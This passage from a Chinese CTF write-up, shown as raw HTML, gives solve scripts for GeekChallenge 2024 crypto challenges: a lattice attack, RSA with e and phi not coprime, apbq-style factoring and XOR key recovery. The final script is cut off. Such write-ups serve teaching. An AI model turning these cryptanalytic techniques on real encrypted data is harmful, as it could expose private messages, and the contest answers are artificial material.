style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:4.2633em;"><span style="top:-7.1108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-5.9108em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.8842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.6667em;bottom:0em;"></span></span></span></span><span style="top:-2.6842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.4842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-0.2842em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.7633em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.825em;"><span style="top:-5.8249em;"><span class="pstrut" style="height:9.2em;"></span><span style="width:0.875em;height:7.200em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="7.200em" viewBox="0 0 875 7200"><path d="M76,0c-16.7,0,-25,3,-25,9c0,2,2,6.3,6,13c21.3,28.7,42.3,60.3,63,95c96.7,156.7,172.8,332.5,228.5,527.5c55.7,195,92.8,416.5,111.5,664.5c11.3,139.3,17,290.7,17,454c0,28,1.7,43,3.3,45l0,3609c-3,4,-3.3,16.7,-3.3,38c0,162,-5.7,313.7,-17,455c-18.7,248,-55.8,469.3,-111.5,664c-55.7,194.7,-131.8,370.3,-228.5,527c-20.7,34.7,-41.7,66.3,-63,95c-2,3.3,-4,7,-6,11c0,7.3,5.7,11,17,11c0,0,11,0,11,0c9.3,0,14.3,-0.3,15,-1c5.3,-5.3,10.3,-11,15,-17c242.7,-294.7,395.3,-681.7,458,-1161c21.3,-164.7,33.3,-350.7,36,-558l0,-3744c-2,-159.3,-10,-310.7,-24,-454c-53.3,-528,-210,-949.7,-470,-1265c-4.7,-6,-9.7,-11.7,-15,-17c-0.7,-0.7,-6.7,-1,-18,-1z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.375em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel sizing reset-size6 size5">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.08em;vertical-align:-0.315em;"></span><span class="minner sizing reset-size6 size5"><span class="mopen sizing reset-size5 size6 delimcenter" style="top:0.025em;">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="minner">…</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mord">/</span><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.85em;"><span style="top:-2.91em;"><span class="pstrut" style="height:2.9em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35em;"><span></span></span></span></span></span></span></span><span class="mclose sizing reset-size5 size6 delimcenter" style="top:0.025em;">)</span></span></span></span></span></span></p><p>为了使右列向量的比特位相同，b=getPrime(400), 且b &lt; K, 显然K得取<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>400</mn></msup></mrow><annotation encoding="application/x-tex">2^{400}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">400</span></span></span></span></span></span></span></span></span></span></span></span>。<br>然后就继续愉快的套公式吧~</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line">c = [</span><br><span class="line"></span><br><span class="line">    <span class="number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>,</span><br><span class="line">    <span class="number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>,</span><br><span class="line">    <span class="number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>,</span><br><span class="line">    <span class="number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>,</span><br><span class="line">    <span class="number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">a = [</span><br><span class="line"></span><br><span class="line">    <span class="number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>,</span><br><span class="line">    <span class="number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>,</span><br><span class="line">    <span class="number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>,</span><br><span class="line">    <span class="number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>,</span><br><span class="line">    <span class="number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line"></span><br><span class="line">M = Matrix(QQ, n + <span class="number">2</span>, n + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line"></span><br><span class="line">    M[i, i] = p</span><br><span class="line">    M[-<span class="number">2</span>, i] = a[i]</span><br><span class="line">    M[-<span class="number">1</span>, i] = -c[i]</span><br><span class="line"></span><br><span class="line">K = <span class="number">2</span> ^ <span class="number">400</span></span><br><span class="line">t = K / p</span><br><span class="line"></span><br><span class="line">M[-<span class="number">2</span>, -<span class="number">2</span>] = t</span><br><span class="line">M[-<span class="number">1</span>, -<span class="number">1</span>] = K</span><br><span class="line"></span><br><span class="line">L = M. LLL()</span><br><span class="line"></span><br><span class="line">x = L[<span class="number">1</span>][-<span class="number">2</span>] // t</span><br><span class="line">m = x % p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(m).bit_length())</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/WP/GeekChallenge2024/hnp.png" alt=""></p><h2 id="LinkedListModular">LinkedListModular</h2><p>逆向部分我不会，主要说我的逆向队友爆出来的部分：</p><pre><code>p:0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb q:0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b e:0xd322 c:0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ffp:0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b q:0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1 e:0x10ae c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f e:0xc051 c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 e:0xd2c2 c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</code></pre><p>它说用轩禹直接解解不出来，注意到题目说注意e和phi，能看出e和phi不互素。<br>然后就发他了个脚本解决（这题不需要考虑t=2时的二次同余）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    <span class="built_in">print</span>(d)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(msg[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x7A7B8EE72D467EEFE378502CA7804E0B55E0B68987DD7E8C03F7F7F717554183D2A0D99C7B33E8E1A28BE171B77F8974616AC49645D7D5CF6FE5F4DCBFD1D25C3AD75E1EB3E4038D55A29C7114E176FD34626C2A8E76021D079CDB85CC8016ACAB00047910DFA5CD0439A3CC13527557EA879C184454A443711083A4F9D1D46B</span></span><br><span class="line">q = <span class="number">0xC17C7A7FBC5469AF413F79C07CC5B892CFBBAA00950B115E267E83E2669F3F6779C7302ECFC9F850E0E4185892E96D356D65B1D372432C5A3F297CFB8373FE9A090A3F8DADF6EF6F2CA5B5107454EE6B1385D165BB4BB7776CBBCCB8DE1993A5EBB34EE365FF39B9EC9613121BA99D74759E0BF80726805CE03ED7F1E49375F1</span></span><br><span class="line">e = <span class="number">0x10AE</span></span><br><span class="line">c = <span class="number">0x5BE0DF3BB240FFD53F2D914EB79878231821A1DBA5CC491A888C8FD553A905A7F1CEA2750C39EA48AB4175115591310C0F9D63E1AEE9D2480780F3CE4F98C57114CD2901EA6F560E04A0A9CEC157DAC3DEF734FA10AB54C27BF20211CF1F1F6F6AFE5FC9EF5C9AF864F054A5E61C48C6E6DC087CC350008D4232D08B0B5011923F1077EAD75D54A792AA8A51A0B37BFA3FAEF0B9380CFF209C7BF3A20FBBB087CAF177B83C9BF03E965BD7347DD18418F3E50AEF29CC89FA594CCD31B6F63F397EEBA71629FEC2C8699148DFD6BE32DEB96577690814BB4FE6DBEFE2379468E0E317A870795BA04AB2E306FE5340700C415048EFF5909A2453752845572A0931</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><p>最后加起来md5就做出来了</p><h2 id="Number-theory">Number theory</h2><p>风二西的题库能找到第一部分</p><p>第二部分有点像2024年强网杯的abpq，但比它简单。<br>wp参考自<br><a href="https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py">https://github.com/josephsurin/my-ctf-challenges/blob/509f60c5e57f773fe768f01d573effcf0d5e010b/downunderctf-2023/apbq-rsa-i/solve/solv.py</a><br>一个比赛用一个，爽</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto. Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line">h0 = <span class="number">3220497006402049508998763812708472832647814868290156746347730942871191356255789659370553564805270033069126673720344310199953651087754072020225702916105541813428786992668144172000495857408180695235017329451164552864440669887978780387408892281885728829108705426036377534262123812335152528611168777211280571694805002313718755871797426493929314877273385162106226582910473718696585558235361302211164190022765345477880209355073870857330694309139033191510002831755011163554405501084092882774630793037506647051531578470767441695642108269033577519614546722167605348209455599860877630930453549375215766657975702946679735793440</span></span><br><span class="line">n1 = <span class="number">20609629372145649869124883931477035418773265506807982287973634398860995335157854064383658546598627777214414513344620919765235474447787454254677033199140440513722365295528339478763686234572386246701669139829187532179573583918405628738545887852577214800663095592976049188005405242091639210252676232732956312108538849591909382864675439965387851084691144379692503823575367370407191667133473482821484955537306602611587604747693171586870973700406072872451067709522642066831289686968535823774273770385924779368338446367102184983154486987531633971065357864924738084803301054789863293592286600424063888458243900130876991944561</span></span><br><span class="line">q = gcd(<span class="built_in">pow</span>(<span class="number">2024</span>, n1, n1) - h0, n1)</span><br><span class="line">p1 = n1 // q</span><br><span class="line"><span class="keyword">assert</span> p1 * q == n1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p1=&quot;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p1= 173372720206385834569678471333958784638586614453461924694852799411511525290419983713543942463722586256841515819523624239173976987599088346657357916198852116172460701468448365355983089723151147709153372627090761707327697899769559661187061166392094719933102425550671003720484285964838360777691632929809407043791</span></span><br><span class="line"><span class="string">q= 118874695786116734917065043442458952547874656505388902849583986739750433740760352688054822604427183355141871756128562592954061494068247418404217180198818025424511398092449124305805738302689459754842048957858402877387959339315483803736974651246922275580029822892751678239186974759117933061631242872453942209471</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h1 = a1 * p + b1 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># h2 = a2 * p + b2 * q1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n2 = p * q1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">hints = [</span><br><span class="line"></span><br><span class="line">    <span class="number">49194502383195208917988199785355579000471120627698824524136563939112767971337049691779758664899497703009458337602635607307068610164325874221815125058246159504553260658300727486252329656228567456351563661171511248498573151135374757953887871426130912974127123668357951196795364055703535399924661649957282476915345782505912688106575686848420343362888</span>,</span><br><span class="line">    <span class="number">56029812337811022982598747354987989915364610368395101948222609237230875599013444593473706280586983516630982411154519894488542135837471701015074142753084529513202513061481615522865380857058628008542724882609524855349464549317203533208567803034618377155637303135785566874122555481931560957334493233423618193735362609235034574175221191665401074291634</span>,</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">n2 = <span class="number">21127172569887870569621986802814771398069606826661397979515556618791602174698226712111670185315617811180192688381471253591193212149192104216153890060029438171543010427356810059660168369171504065120474047401466632600230981702536898738744701541132759858595341068713321976579864810553447534204513491008705215041861247277449063318972113826820821732327255577559447446606667162763843696891825420560307688553022453470653875157114663943723258181186659915926780802902213978395961981750159147594076399769386787561910947372748908551775527715538708855235861297549189165238857651886658156332640360898769204102407630920314871304057</span></span><br><span class="line">c = <span class="number">5607552428806279725164332098717496105359323731793797865776852054987286366396268835656116948807084338497364746716217052175055013330847114498067023163878490040957130515880922531725226729467904687450269817551037876044274898360914422201634758724176912018795267171627398316542607462818553194467631468793807762529509728325759331142060865432879561622747895422022839077034959965640817419843376693946391886148327389538923557583964708218796910422008150480950732394548385083016293891237783400286493750498647816940000092965104858068292374074379723230507283787259827582725133425982004517180631242028412315096023451549819804660838</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a1, a2 <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(itertools.product(<span class="built_in">range</span>(<span class="number">2</span>**<span class="number">13</span>), repeat=<span class="number">2</span>))):</span><br><span class="line"></span><br><span class="line">    kp = gcd(a1 * hints[<span class="number">0</span>] - a2 * hints[<span class="number">1</span>], n2)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kp &lt; n2:</span><br><span class="line">        <span class="built_in">print</span>(</span><br><span class="line">            <span class="string">&quot;find!&quot;</span>, kp, a1, a2</span><br><span class="line">        )  <span class="comment"># find! 178557871889789476735392773689039729944728430625818764599203953284194468360955366524476361619864195810267037397001299832526726480560276846147351034417947012223276604383027178163281207815083989579760615671067777036793963045167137767877397560786425871554804100602428308050015870442290953340882348809647523234561 8161 4513</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">        kp //= i</span><br><span class="line"></span><br><span class="line">p = kp</span><br><span class="line">q2 = n2 // p</span><br><span class="line"><span class="keyword">assert</span> p * q2 == n2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, p * q)</span><br><span class="line">flag = long_to_bytes(m).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="X0R">X0R</h2><p>问gpt的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的值</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">flag_prefix = <span class="string">b&quot;SYC&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤1: 将e2转换回e1</span></span><br><span class="line">e1 = e2 ^ f2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤2: 将e1转换回enc</span></span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤3: 将enc转换为bytes</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤4: 推测key的前四个字节</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(flag_prefix, enc_bytes[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤5: 使用推测的key解出flag</span></span><br><span class="line">flag = <span class="built_in">bytes</span>(</span><br><span class="line">    a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(enc_bytes, key_bytes * (<span class="built_in">len</span>(enc_bytes) // <span class="built_in">len</span>(key_bytes)))</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(key_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>自己后来的解法</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2 = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line">e1 = f2 ^ e2</span><br><span class="line">enc = e1 ^ f1</span><br><span class="line">enc = long_to_bytes(enc)</span><br><span class="line">key = xor(enc, <span 